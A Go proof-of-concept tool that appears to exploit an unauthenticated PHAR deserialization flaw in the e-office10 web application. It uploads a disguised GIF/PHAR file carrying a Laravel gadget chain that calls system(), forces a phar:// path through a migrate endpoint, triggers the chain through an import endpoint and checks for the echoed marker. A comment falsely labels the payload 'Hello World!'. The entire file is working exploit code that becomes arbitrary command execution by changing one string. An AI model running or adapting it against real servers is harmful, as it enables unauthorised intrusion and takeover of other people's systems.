package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math/big"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

// randomLowercase generates a random lowercase string of length n.
func randomLowercase(n int) (string, error) {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	bytes := make([]byte, n)
	for i := range bytes {
		num, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		if err != nil {
			return "", err
		}
		bytes[i] = letters[num.Int64()]
	}
	return string(bytes), nil
}

// base64Decode decodes a base64 encoded string and returns it as a string.
func base64Decode(v1 string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(v1)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

func makeURL(baseURL string, addPath string) (string, error) {
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		fmt.Println("Error parsing base URL:", err)
		return "", err
	}

	pathURL, err := url.Parse(addPath)
	if err != nil {
		fmt.Println("Error parsing path:", err)
		return "", err
	}

	resolvedURL := parsedURL.ResolveReference(pathURL)
	return resolvedURL.String(), nil
}

// uploadPayload sends a POST request and returns the extracted attachment_id.
func uploadPayload(baseurl string, payload string) (string, error) {
	uploadPath := "/eoffice10/server/public/api/attachment/atuh-file"
	targetUrl, err := makeURL(baseurl, uploadPath)
	if err != nil {
		return "", err
	}

	boundary, err := randomLowercase(8)
	if err != nil {
		return "", err
	}

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	err = writer.SetBoundary(boundary)
	if err != nil {
		return "", err
	}

	part, err := writer.CreateFormFile("Filedata", "register.inc")
	if err != nil {
		return "", err
	}
	part.Write([]byte(payload))
	writer.Close()

	req, err := http.NewRequest("POST", targetUrl, body)
	if err != nil {
		return "", err
	}

	req.Header.Set("Content-Type", fmt.Sprintf("multipart/form-data; boundary=%s", boundary))
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Encoding", "gzip, deflate")

	//// set http proxy
	//proxyUrl, err := url.Parse("http://127.0.0.1:8080")
	//if err != nil {
	//	return "", err
	//}
	//transport := &http.Transport{
	//	Proxy: http.ProxyURL(proxyUrl),
	//}
	//
	//client := &http.Client{
	//	Transport: transport,
	//}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	responseBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	re := regexp.MustCompile(`"attachment_id":"(?P<attachment_id>.+?)"`)
	matches := re.FindStringSubmatch(string(responseBody))
	if len(matches) < 2 {
		return "", fmt.Errorf("attachment_id not found")
	}

	return matches[1], nil
}


func migrate(baseURL string) bool {
	migratePath := "/eoffice10/server/public/api/attachment/path/migrate"
	fullURL, err := makeURL(baseURL, migratePath)
	if err != nil {
		fmt.Println("Error creating full URL:", err)
		return false
	}

	formData := url.Values{}
	formData.Set("source_path", "")
	formData.Set("desc_path", "phar://../../../../attachment/")

	req, err := http.NewRequest("POST", fullURL, bytes.NewBufferString(formData.Encode()))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}

	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return false
	}
	defer resp.Body.Close()

	var response struct {
		Status int `json:"status"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		fmt.Println("Error decoding response:", err)
		return false
	}

	return response.Status == 1
}


func importPhar(baseURL string, attachmentID string) bool {
	fullURL, err := makeURL(baseURL, "/eoffice10/server/public/api/empower/import")
	if err != nil {
		fmt.Println("Error creating full URL:", err)
		return false
	}

	formData := url.Values{}
	formData.Set("type", "tttt")
	formData.Set("file", attachmentID)

	req, err := http.NewRequest("POST", fullURL, bytes.NewBufferString(formData.Encode()))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}

	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return false
	}
	defer resp.Body.Close()

	responseBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return false
	}

	responseStr := string(responseBody)
	if strings.Contains(responseStr, "9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P") && strings.Contains(responseStr, `"code":"no_file"`) {
		return true
	}

	return false
}

func verify(baseurl string) bool {
	payloadbs64 := "R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8" +
		"+DQpEAQAAAQAAABEAAAABAAAAAAAOAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6Mzc6ImVjaG8gOXlNODZFU3lGQlhORHdDaDZOYnN4eTl3cmNRclAyNVAiO319CAAAAHRlc3QudHh0BAAAAEvbA2YEAAAADH5/2KQBAAAAAAAAdGVzdIEpwGmDhmYzxumoAjJwcaz4EdU+AgAAAEdCTUI=" // Base64 for "Hello World!"
	payload, err := base64Decode(payloadbs64)
	if err != nil {
		fmt.Println("Error decoding string:", err)
		return false
	}

	attachmentID, err := uploadPayload(baseurl, payload)
	if err != nil {
		fmt.Println("Error uploading payload:", err)
		return false
	}
	fmt.Println("Attachment ID:", attachmentID)

	checkStatus := migrate(baseurl)
	if !checkStatus {
		return false
	}

	checkPhar := importPhar(baseurl, attachmentID)
	if checkPhar {
		//fmt.Println("PHAR import successful!")
		return true
	}
	return false
}

func main() {
	urlFlag := flag.String("url", "", "URL to verify")
	flag.Parse()
	baseurl := *urlFlag

	if baseurl == "" {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
		os.Exit(1)
	}

	if verify(baseurl) {
		fmt.Println("Vulnerable!")
	} else {
		fmt.Println("Not vulnerable!")
	}
}
